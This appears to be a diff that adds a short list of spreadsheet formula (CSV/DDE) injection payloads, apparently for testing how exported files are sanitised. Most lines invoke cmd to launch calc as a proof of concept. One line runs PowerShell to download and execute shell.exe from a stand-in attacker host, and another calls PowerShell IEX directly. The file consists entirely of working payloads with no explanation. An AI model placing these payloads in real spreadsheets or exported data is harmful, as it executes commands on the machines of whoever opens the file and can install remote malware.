@@ -1,0 +1,10 @@
+=10+20+cmd|'/c calc'!A1
++1+1+cmd|'/c calc'!A1
+-1+1+cmd|'/c calc'!A1
+=1+1+cmd|'/c calc'!A1
+=1+1+cmd|'/c powershell IEX(wget attacker.com/shell.exe)'!A1
+=1+2+cmd|'/c calc'!A1
+=cmd|'/c calc'!A1
+=cmd|'/c powershell IEX'!A1
+@SUM(1+1)*cmd|'/c calc'!A1
+@SUM(1+9)*cmd|'/c calc'!A1
